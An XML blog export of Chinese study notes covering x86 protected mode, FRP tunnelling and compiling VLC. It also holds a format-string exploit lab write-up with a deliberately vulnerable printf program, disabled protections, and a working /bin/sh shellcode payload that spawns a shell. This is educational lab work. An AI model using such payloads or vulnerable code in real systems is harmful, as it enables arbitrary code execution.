<li>当指令访问段时</li>
<li>任何指令不能写一个可执行段</li>
<li>任何指令不能写一个可写位没有置位的数据段</li>
<li>任何指令不能读一个可执行段，除非可执行段设置了可读标志</li>
</ul>
<h3 id="特权级检查"><a href="#特权级检查" class="headerlink" title="特权级检查"></a>特权级检查</h3><ul>
<li>CPL的值即为CS和SS寄存器的低2位(保护模式中要求任何时候代码段和堆栈段的CPL一致) </li>
<li>关于更详细和细致地代码段特权级检查可参考<a href="http://blog.csdn.net/trochiluses/article/details/8968386">代码一致性和非一致性</a></li>
<li>数据段中主要是CPL、RPL和DPL的逻辑比较</li>
<li>属性字段的匹配</li>
</ul>
<h3 id="指令集限制"><a href="#指令集限制" class="headerlink" title="指令集限制"></a>指令集限制</h3><ul>
<li>主要是非特权程序不能执行特权指令</li>
</ul>
<h2 id="页级保护"><a href="#页级保护" class="headerlink" title="页级保护"></a>页级保护</h2><p><img src="/images/Linux_0.11_chapter4_page_check.png" alt="Linux_0.11_chapter4_page_check.png"></p>
<h1 id="中断和异常处理"><a href="#中断和异常处理" class="headerlink" title="中断和异常处理"></a>中断和异常处理</h1><blockquote>
<p>硬件机制和软件处理两者完美结合才能完成一个良好的系统的设计</p>
</blockquote>
<p><img src="/images/Linux_0.11_chapter4_interrupt_vector.png" alt="Linux_0.11_chapter4_interrupt_vector.png"></p>
<ul>
<li>把中断看作是另一个控制流程即可,从逻辑上符合人类思考。</li>
<li>需要提前填充处理过程的地址，处理器自动加载并跳转执行。</li>
<li>中断源来自硬件(INTR和NMI引脚)和软件(指令各种内部错误和主动发起的int n软中断)</li>
<li>中断优先级规定<br><img src="/images/Linux_0.11_chapter4_interrupt_priority.png" alt="Linux_0.11_chapter4_interrupt_priority.png"> </li>
<li>IDT可以存放三种门描述符<blockquote>
<p>这些描述符相当于也只是指针，真正的过程实现不能直接找到,需要继续定位</p>
</blockquote>
</li>
</ul>
<ul>
<li>中断门:含有长指针，即段选择子和偏移，显式调用中断门时候的长指针偏移被忽略，因为此处才是真正的入口地址</li>
<li>陷阱门:同上，但进入后eflags状态寄存器IF标志位不置位</li>
<li>任务门:用于任务切换，作用于tss</li>
<li>异常和中断处理过程与以前的差不多，只是会增加更多检查以及切换的时候多压栈更多数据结构和追踪量，并还可以进行任务切换，相当于常规调度了。</li>
</ul>
<h1 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h1><ul>
<li>任务有多种叫法，也可叫进程，是相对于程序而言的。针对磁盘上(或更泛统称非易失性存储器)和内存中(CPU可直接寻址并进行取指译码执行过程的存储单元)目标文件的布局等等特性概念来划分。</li>
<li>在OS概念中PCB+程序=进程</li>
<li>Intel芯片提供硬件级别的任务切换(处理器自动保存和加载tss)</li>
<li>任务状态包括但不限于:</li>
<li>所有通用寄存器和段寄存器信息</li>
<li>EFLAGS、EIP、CR3、TR和LDTR</li>
<li>段寄存器指定的任务当前执行空间</li>
<li>I/0映射位图基地址和I/O位图信息(TSS)</li>
<li>特权级0、1和2的堆栈指针(TSS)</li>
<li>链接至前一个任务的链指针(TSS，主要用于嵌套中断)</li>
<li>详细可继续参考Intel手册…</li>
</ul>
<h1 id="保护模式编程的初始化"><a href="#保护模式编程的初始化" class="headerlink" title="保护模式编程的初始化"></a>保护模式编程的初始化</h1><blockquote>
<p>进入保护模式之前必须搭建起环境</p>
</blockquote>
<ul>
<li>IDT</li>
<li>GDT</li>
<li>TSS</li>
<li>LDT</li>
<li>若开启分页，则最少一个页目录和一个页表可用</li>
<li>处理器切换到保护模式运行的代码段</li>
<li>含有中断和异常处理的代码模块</li>
<li>初始化GDTR、IDTR、CR3等</li>
<li>而后置位CR0的PE位并jmp清空流水线即可运行在保护模式下<h1 id="一个简单的多任务内核例子"><a href="#一个简单的多任务内核例子" class="headerlink" title="一个简单的多任务内核例子"></a>一个简单的多任务内核例子</h1></li>
</ul>
<blockquote>
<p>先安装个环境跑一下….   </p>
</blockquote>
<h2 id="囧囧囧o（╯□╰）o"><a href="#囧囧囧o（╯□╰）o" class="headerlink" title="囧囧囧ｏ（╯□╰）ｏ"></a>囧囧囧ｏ（╯□╰）ｏ</h2><ul>
<li>由于这两天赵博士维护的开源网站<a href="http://www.oldlinux.org/">www.oldlinux.org</a>貌似突然down掉了，真是资料到用的时候方恨没下载。不过幸好我早期下载了一份<strong>Linux-0.11-040305</strong>。按照网上的教程手动编译源码后进入这个文件夹，翻到书最后一章，仿照并依据自身实际情况修改，如下图所示，终于跑上了系统。<br><img src="/images/Linux_0.11_chapter4_run_linux_0.11_hd.png" alt="Linux_0.11_chapter4_run_linux_0.11_hd.png"></li>
<li>我的配置<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rutk1t0r@Rutk1t0r:linux-0.11-040305$ cat bochsrc-hd-new.bxrc </span><br><span class="line">romimage: file=<span class="variable">$BXSHARE</span>/BIOS-bochs-latest</span><br><span class="line">megs: 16</span><br><span class="line">vgaromimage: file=/usr/<span class="built_in">local</span>/share/bochs/VGABIOS-lgpl-latest</span><br><span class="line">floppya: 1_44=bootimage-0.11-hd.new, status=inserted</span><br><span class="line">ata0-master: <span class="built_in">type</span>=disk, path=<span class="string">&quot;hdc-0.11.img&quot;</span>, mode=flat, cylinders=121, heads=16, spt=63</span><br><span class="line">boot: a</span><br><span class="line">rutk1t0r@Rutk1t0r:linux-0.11-040305$ bochs -f ./bochsrc-hd-new.bxrc</span><br></pre></td></tr></table></figure>
<img src="/images/Linux_0.11_chapter4_run_linux_0.11_bochs_self.png" alt="Linux_0.11_chapter4_run_linux_0.11_bochs_self.png"></li>
</ul>
<blockquote>
<p>接下来应该编译这个小程序并融合进去，看是否有错误…</p>
</blockquote>
<h2 id="自个儿来折腾"><a href="#自个儿来折腾" class="headerlink" title="自个儿来折腾"></a>自个儿来折腾</h2><ul>
<li>由于这两天我一直在折腾这个事情，收获也颇丰富，因此决定来一个番外篇,请转<a href="http://www.rutk1t0r.org/2016/11/22/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%95%AA%E5%A4%96%E7%AF%87/">这篇文章</a>。<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1></li>
<li>Intel的保护模式确实很复杂，如果想要完全深入理解必须要动手鼓捣鼓捣</li>
<li><a href="http://www.tinylab.org/linux-0.11-lab/">泰晓科技</a>有大牛已经搭建好了平台，只需简单make即可，并且linux 0.11系统也具有gcc。</li>
</ul>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 编译环境搭建</title>
    <url>/embpgp.github.io/2016/12/20/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<blockquote>
<p>关于Linux 0.11源代码网上已经有很多不同程度修改的版本了，而且某些还是继续有编译链接问题的，不如站在前人的肩膀上继续”搬砖”。</p>
</blockquote>
<span id="more"></span>

<hr>
<p>参考资料<br><a href="http://www.tinylab.org/linux-0.11-lab/">http://www.tinylab.org/linux-0.11-lab/</a></p>
<p>如参考资料,很丰富也很全面，用来学习和分析很有必要。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>VPC网络打通研究</title>
    <url>/embpgp.github.io/2021/08/08/VPC%E7%BD%91%E7%BB%9C%E6%89%93%E9%80%9A%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<blockquote>
<p>云内网络打通</p>
</blockquote>
<span id="more"></span>
<hr>
<p><strong>参考资料</strong></p>
<ul>
<li><a href="https://gofrp.org/docs/" title="frp">gofrp</a></li>
<li><a href="https://github.com/ntop/n2n" title="n2n">n2n</a></li>
<li><a href="https://github.com/ehang-io/nps/blob/master/README_zh.md" title="nps">nps</a></li>
</ul>
<hr>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在云内多VPC场景下，需要实现多NFV极简+管控+运维+部署。传统的安全管理平台采用平台侧主动推送和纳管NFV组件， 但是在VPC场景下网络打通存在中间的访问控制策略隔离，以及私有网络的暴露面问题。</p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul>
<li>正向打通：网络往往采用NAT技术或者代理服务器，将内网的服务暴露出来，但是这样的运维成本较大，且存在安全性问题。 采用VPN技术需要两端都外挂前置设备或者软件。</li>
<li>逆向打通：技术上采用将原本的服务端安装一个client_agent，通过反向的先让client_agent接入原本的客户端的server_proxy， 然后代理程序本身实现IP级别或者PORT级别的隧道数据转发，下面分析逆向打通的几个方案。</li>
</ul>
<h1 id="开源方案"><a href="#开源方案" class="headerlink" title="开源方案"></a>开源方案</h1><table>
<thead>
<tr>
<th align="center">技术方案</th>
<th align="center">优点</th>
<th align="center">缺点</th>
</tr>
</thead>
<tbody><tr>
<td align="center">N2N</td>
<td align="center">功能丰富，满足需求，实现IP2IP级别访问</td>
<td align="center">采用内核方案，稳定性差</td>
</tr>
<tr>
<td align="center">NPS</td>
<td align="center">功能丰富，控制面安全性较好</td>
<td align="center">GPL协议无法商用</td>
</tr>
<tr>
<td align="center">FRP</td>
<td align="center">功能较丰富，apache协议可以商用</td>
<td align="center">控制面安全性一般</td>
</tr>
</tbody></table>
<h1 id="FRP方案分析"><a href="#FRP方案分析" class="headerlink" title="FRP方案分析"></a>FRP方案分析</h1><p>为了满足商用需求，可以考虑采用FRP作为VPC网络打通数据面的方案，默认监听7000端口。<br>引入另外的独立的控制面来负责FRP的统一管理/升级维护/横向扩展/高可用等，以满足持续迭代的需求。</p>
<h1 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h1><p>参考<a href="https://gofrp.org/docs/examples/ssh/" title="示例">官网教程</a> 直接配置frpc.ini和frps.ini即可</p>
<blockquote>
<p>因此在client上如何管理好frpc.ini是重点.</p>
</blockquote>
<p>frps.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以选择默认启用tls_only选项以及token。</li>
<li>可以启用服务端插件功能获取frpc的接入上下文来实现访问控制。</li>
</ul>
<p>frpc.ini </p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure>
<p>绝大部分的业务都是tcp。这里可以通过设置local_ip为路由可达的服务器地址，而不仅仅局限于本地通信，因为经常作为hacker的横向扩展工具使用。 具体参考<a href="https://gofrp.org/docs/reference/" title="配置">配置文件</a>。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>多学习开源项目的设计思路</li>
<li>多看看开源代码的编码风格</li>
</ul>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>设计</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>compile VLC for Linux</title>
    <url>/embpgp.github.io/2017/08/25/compile-VLC-for-Linux/</url>
    <content><![CDATA[<p>参考资料：<br>依赖项：<a href="http://www.cnblogs.com/oloroso/p/4595136.html">http://www.cnblogs.com/oloroso/p/4595136.html</a><br>Aclocal版本重新校正：<a href="https://github.com/threatstack/libmagic/issues/3">https://github.com/threatstack/libmagic/issues/3</a><br>临时卸载QT5：<a href="https://forum.videolan.org/viewtopic.php?t=124188&start=20">https://forum.videolan.org/viewtopic.php?t=124188&amp;start=20</a></p>
<span id="more"></span>
<hr>
<h1 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h1><ul>
<li><p>在<a href="https://www.videolan.org/vlc/download-sources.html">官网</a>或者<a href="https://github.com/videolan/vlc">Github仓库</a>将源码下载到本地。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pgp@r00t:~/github/vlc-2.2.6$ ls </span><br><span class="line">ABOUT-NLS   autotools  ChangeLog    configure     COPYING      extras   lib         Makefile.am  NEWS    share  THANKS</span><br><span class="line">aclocal.m4  bin        compat       configure.ac  COPYING.LIB  include  m4          Makefile.in  po      src</span><br><span class="line">AUTHORS     bootstrap  config.h.in  contrib       doc          INSTALL  make-alias  modules      README  <span class="built_in">test</span></span><br><span class="line">pgp@r00t:~/github/vlc-2.2.6$</span><br></pre></td></tr></table></figure></li>
<li><p>首先查看源码的INSTALL文件了解如何编译源码，如果没有configure文件则需要先运行bootstrap脚本来生成它。</p>
</li>
</ul>
<h1 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h1><ul>
<li><p>之后运行<code>./configure</code>即可配置，此过程可能会遇到很多检查不通过，而且会不断地运行该命令来检查是否配置正确。因此先参考<a href="http://www.cnblogs.com/oloroso/p/4595136.html">链接</a>来解决一些依赖性问题。对于ubuntu可在终端直接键入<code>sudo apt-get build-dep vlc</code>。</p>
</li>
<li><p>对于问题“configure: error: “You cannot build VLC with Qt-5.5.0. You need to backport I78ef29975181ee22429c9bd4b11d96d9e68b7a9c””<a href="https://forum.videolan.org/viewtopic.php?t=124188&start=20">网络上</a>给出的解决方案是暂时移除Qt5相关库，在编译通过后以后若需要则再安装回来即可。键入<code>sudo apt remove qt5-default qt5-qmake qtbase5-dev qtbase5-dev-tools libqt5opengl5-dev libqt5x11extras5-dev </code>,之后继续<code>./configure</code>。当遇到如下提示则表明可进行编译了。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">libvlc configuration</span><br><span class="line">--------------------</span><br><span class="line">version               : 2.2.6</span><br><span class="line">system                : linux</span><br><span class="line">architecture          : x86_64 mmx sse sse2</span><br><span class="line">optimizations         : yes</span><br><span class="line">vlc aliases           : cvlc rvlc nvlc</span><br><span class="line"></span><br><span class="line">To build vlc and its plugins, <span class="built_in">type</span> `make<span class="string">&#x27;, or `./compile&#x27;</span> <span class="keyword">if</span> you like nice colors.</span><br></pre></td></tr></table></figure>

<ul>
<li>编译完成</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pgp@r00t:~/github/vlc-2.2.6$ ls </span><br><span class="line">ABOUT-NLS   bin        compile      config.status  COPYING      doltcompile  INSTALL  make-alias   modules  README  stamp-h1</span><br><span class="line">aclocal.m4  bootstrap  config.h     configure      COPYING.LIB  doltlibtool  lib      Makefile     NEWS     rvlc    <span class="built_in">test</span></span><br><span class="line">AUTHORS     ChangeLog  config.h.in  configure.ac   cvlc         extras       libtool  Makefile.am  nvlc     share   THANKS</span><br><span class="line">autotools   compat     config.log   contrib        doc          include      m4       Makefile.in  po       src     vlc</span><br><span class="line">pgp@r00t:~/github/vlc-2.2.6$ ./vlc --version</span><br><span class="line">VLC media player 2.2.6 Umbrella (revision 2.2.6-0-g1aae78981c)</span><br><span class="line">VLC version 2.2.6 Umbrella (2.2.6-0-g1aae78981c)</span><br><span class="line">Compiled by pgp on r00t (Aug 28 2017 10:47:37)</span><br><span class="line">Compiler: gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4)</span><br><span class="line">This program comes with NO WARRANTY, to the extent permitted by law.</span><br><span class="line">You may redistribute it under the terms of the GNU General Public License;</span><br><span class="line">see the file named COPYING <span class="keyword">for</span> details.</span><br><span class="line">Written by the VideoLAN team; see the AUTHORS file.</span><br><span class="line">pgp@r00t:~/github/vlc-2.2.6$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>搭建VLC编译环境的主要目的还是为了学习一下其内部某些库对于音视频流标准的解析和构建算法。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>fmt_exploit</title>
    <url>/embpgp.github.io/2017/01/07/fmt-exploit/</url>
    <content><![CDATA[<p>可参考资料不限于但包括:<br><a href="http://bbs.pediy.com/">0day安全 软件漏洞分析技术</a><br><a href="https://zhuanlan.zhihu.com/p/24489276">https://zhuanlan.zhihu.com/p/24489276</a><br><a href="http://www.cis.syr.edu/~wedu/seed/">逆向工程学习平台</a><br><a href="http://www.xfocus.net/articles/200103/123.html">http://www.xfocus.net/articles/200103/123.html</a><br><a href="http://www.freebuf.com/articles/system/74224.html">http://www.freebuf.com/articles/system/74224.html</a><br><a href="http://nullablesecurity.blogspot.co.uk/">http://nullablesecurity.blogspot.co.uk/</a><br><a href="http://bbs.pediy.com/showthread.php?t=123602">Exploit 编写教程</a><br><a href="https://github.com/shiyanlou/seedlab/blob/master/formatstring.md">https://github.com/shiyanlou/seedlab/blob/master/formatstring.md</a><br><a href="http://staff.ustc.edu.cn/~billzeng/seclab/selab02.pdf">http://staff.ustc.edu.cn/~billzeng/seclab/selab02.pdf</a><br><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X/ref=sr_1_1?ie=UTF8&qid=1483684023&sr=8-1&keywords=shellcoders+handbook">The Shellcoder’s Handbook</a></p>
<span id="more"></span>
<hr>
<h1 id="再说说fmt"><a href="#再说说fmt" class="headerlink" title="再说说fmt"></a>再说说fmt</h1><p>在之前一篇<a href="http://www.rutk1t0r.org/2016/09/25/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%92%B8printf%E5%90%A7/">《一起来撸printf吧》</a>中分析了内核中printf(printk)的大体实现，即可以进行一些简单地调试输出，因此实现了基本的参数格式化包括%n。但是应用开发者一般都是使用的glibc提供的C运行时库。而其<a href="ftp://ftp.gnu.org/gnu/glibc/">实现</a>更为复杂，有兴趣的可以参考。微软貌似不太一样，没有实现诸如<code>%$n</code>中的<code>$</code>控制，当然也可以不需要<code>$</code>直接通过之前输入的字符控制。根据前文分析得知类似printf类的函数还有很多，最后大都调用vfprintf函数进一步解析参数，一般不检查参数的合法性而直接进行格式化，写入或读出。因此编译的时候gcc有时候会提示不安全的警告。下面是格式化字符串漏洞的危害:<br><img src="/images/The_shellcoders_handbook_ch04_fmt_use.png" alt="The_shellcoders_handbook_ch04_fmt_use.png"></p>
<h1 id="来个小实验"><a href="#来个小实验" class="headerlink" title="来个小实验"></a>来个小实验</h1><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OS 版本:4.4.0-58-generic <span class="comment">#79-Ubuntu SMP Tue Dec 20 12:12:31 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">gcc: gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4)</span><br><span class="line">libc: lrwxrwxrwx 1 root root 12 11月 17 06:51 /lib/i386-linux-gnu/libc.so.6 -&gt; libc-2.23.so</span><br><span class="line">GNU bash，版本 4.3.46(1)-release (i686-pc-linux-gnu)</span><br></pre></td></tr></table></figure>
<h2 id="测试例程"><a href="#测试例程" class="headerlink" title="测试例程"></a>测试例程</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ls</span><br><span class="line">ascii.c  dowu.c  exit.c  fmt  fmt.c  gen_upload_string.c  Makefile  test.txt</span><br><span class="line">pgp@Rutk1t0r:ch04$ cat fmt.c </span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">/*I have changed the code,so <span class="built_in">let</span> it work*/</span><br><span class="line"></span><br><span class="line">/*In order to implement arbitrary address write I need some <span class="built_in">local</span> vars and strcpy them.*/</span><br><span class="line">/*But I don<span class="string">&#x27;t need overflow the stack*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main( int argc, char *argv[] )</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	char evil[128];</span></span><br><span class="line"><span class="string">	strcpy(evil, argv[1]);</span></span><br><span class="line"><span class="string">	printf( argv[1]);</span></span><br><span class="line"><span class="string">	return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ cat Makefile </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fmt: fmt.c</span></span><br><span class="line"><span class="string">	gcc -fno-stack-protector -z execstack -o fmt fmt.c </span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ps</span></span><br><span class="line"><span class="string">  PID TTY          TIME CMD</span></span><br><span class="line"><span class="string">28187 pts/13   00:00:00 bash</span></span><br><span class="line"><span class="string">29047 pts/13   00:00:00 ps</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ls</span></span><br><span class="line"><span class="string">ascii.c  dowu.c  exit.c  fmt  fmt.c  gen_upload_string.c  Makefile  test.txt</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ./fmt $&#x27;</span>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x9e\xf1\xff\xbf\x9c\xf1\xff\xbf%49119x%10<span class="variable">$hn</span>%12529x%11<span class="variable">$hn</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1����</span></span><br><span class="line"><span class="string">     Qh//shh/bin��̀�����������</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">										 bffff3b9 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                                     To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span></span><br><span class="line"><span class="string">See &quot;man sudo_root&quot; for details.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ps</span></span><br><span class="line"><span class="string">  PID TTY          TIME CMD</span></span><br><span class="line"><span class="string">28187 pts/13   00:00:00 bash</span></span><br><span class="line"><span class="string">29051 pts/13   00:00:00 sh</span></span><br><span class="line"><span class="string">29277 pts/13   00:00:00 ps</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$</span></span><br></pre></td></tr></table></figure>

<h1 id="如何做成这个测试"><a href="#如何做成这个测试" class="headerlink" title="如何做成这个测试?"></a>如何做成这个测试?</h1><p>上面结果就像是’蹦’得一下就完成了，其中还有很多空白字符没有复制过来了。为了这个小测试可谓煞费苦心。首先要找到shellcode,其中表网最知名的莫过于Offensive团队维护的<a href="https://www.exploit-db.com/">Exploit Database</a>。这是个学习的好地方…为了更简单我直接用谷大神的shellcode，选择了一个执行<code>/bin/sh</code>的<a href="https://github.com/embpgp/shellcoding/blob/master/linux/sh/push.c">shellcode</a>。后来出问题的时候还想换成类<code>/bin/nc</code>的反弹或者直连shellcode，无奈<code>-e</code>参数无法执行只好继续用<code>/bin/sh</code>。问题后续会说。</p>
<h2 id="测试程序为何要改"><a href="#测试程序为何要改" class="headerlink" title="测试程序为何要改?"></a>测试程序为何要改?</h2><p>我用的测试例程基于《The Shellcode’s Handbook》.其中的fmt.c就是ch04目录下的。为了gdb调试简单我干脆删掉了对argc的判断和信息提示，本想直接了当地用空壳<code>printf( argv[1] );</code>即可完成测试，到后来发现并不能。为什么？因为类似于printf的格式化字符串漏洞的本质在于对栈空间参数的解析。而我们如果仅仅是单纯读栈空间内存的话很容易，若要写任意内存的话则必须借助%n来实现，而%n也不是那么容易利用的。它仅仅是能够对本次printf的调用在%n之前输出的字符数目(在分析内核中printf的实现的时候可以看到是两个局部指针相减)。因此我认为书中所说写任意数据是得打个问号的。书中的例子连续覆盖地址4个字节，但是要考虑到我们想写的数据字节并非都是递增(递减)。我们仅仅能够通过增加后续字节来使得要写得数据越来越大，因此如果不能保证递增或者递减，那么刚刚写好的数据可能又会被覆盖，因此必须得精心构造。书中提到利用%hn仅仅写16位数据，没错，我就是用这个来实现的。但是如果某些版本的glibc不支持就没辙了。因此我将测试例程改为了在栈空间复制了我的exp，这样我就能够传入我想要写的地址，之后利用%n来将我想写的地址处的数据变为shellcode首地址，exp中我将改写main函数的返回地址。还有个<code>$</code>特性，利用它可以制定具体的参数被处理，这样可以减少exp的体积，便于调试。</p>
<p><img src="/images/The_Shellcodes_Handbook_ch04_write_4_b.png" alt="The_Shellcodes_Handbook_ch04_write_4_b.png"></p>
<h2 id="需要关闭的保护选项"><a href="#需要关闭的保护选项" class="headerlink" title="需要关闭的保护选项"></a>需要关闭的保护选项</h2><ul>
<li>-fno-stack-protector 是为了取消gs的cookie保护，攻防详情可以参考网络或者书籍。</li>
<li>-z execstack 是告诉链接器栈空间数据可以被执行。同上。</li>
<li>保证/proc/sys/kernel/randomize_va_space的值为0,以此关闭ASLR,同上。</li>
</ul>
<h2 id="开启GDB调试"><a href="#开启GDB调试" class="headerlink" title="开启GDB调试"></a>开启GDB调试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ gdb ./fmt </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i686-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from ./fmt...done.</span><br><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x0804843b &lt;+0&gt;:	lea    0x4(%esp),%ecx</span><br><span class="line">   0x0804843f &lt;+4&gt;:	and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line">   0x08048442 &lt;+7&gt;:	pushl  -0x4(%ecx)</span><br><span class="line">   0x08048445 &lt;+10&gt;:	push   %ebp</span><br><span class="line">   0x08048446 &lt;+11&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048448 &lt;+13&gt;:	push   %edi</span><br><span class="line">   0x08048449 &lt;+14&gt;:	push   %ebx</span><br><span class="line">   0x0804844a &lt;+15&gt;:	push   %ecx</span><br><span class="line">   0x0804844b &lt;+16&gt;:	sub    <span class="variable">$0x8c</span>,%esp</span><br><span class="line">   0x08048451 &lt;+22&gt;:	mov    %ecx,%ebx</span><br><span class="line">   0x08048453 &lt;+24&gt;:	lea    -0x98(%ebp),%edx</span><br><span class="line">   0x08048459 &lt;+30&gt;:	mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0804845e &lt;+35&gt;:	mov    <span class="variable">$0x20</span>,%ecx</span><br><span class="line">   0x08048463 &lt;+40&gt;:	mov    %edx,%edi</span><br><span class="line">   0x08048465 &lt;+42&gt;:	rep stos %eax,%es:(%edi)</span><br><span class="line">   0x08048467 &lt;+44&gt;:	mov    0x4(%ebx),%eax</span><br><span class="line">   0x0804846a &lt;+47&gt;:	add    <span class="variable">$0x4</span>,%eax</span><br><span class="line">   0x0804846d &lt;+50&gt;:	mov    (%eax),%eax</span><br><span class="line">   0x0804846f &lt;+52&gt;:	sub    <span class="variable">$0x8</span>,%esp</span><br><span class="line">   0x08048472 &lt;+55&gt;:	push   %eax</span><br><span class="line">   0x08048473 &lt;+56&gt;:	lea    -0x98(%ebp),%eax</span><br><span class="line">   0x08048479 &lt;+62&gt;:	push   %eax</span><br><span class="line">   0x0804847a &lt;+63&gt;:	call   0x8048310 &lt;strcpy@plt&gt;</span><br><span class="line">   0x0804847f &lt;+68&gt;:	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line">   0x08048482 &lt;+71&gt;:	mov    0x4(%ebx),%eax</span><br><span class="line">   0x08048485 &lt;+74&gt;:	add    <span class="variable">$0x4</span>,%eax</span><br><span class="line">   0x08048488 &lt;+77&gt;:	mov    (%eax),%eax</span><br><span class="line">   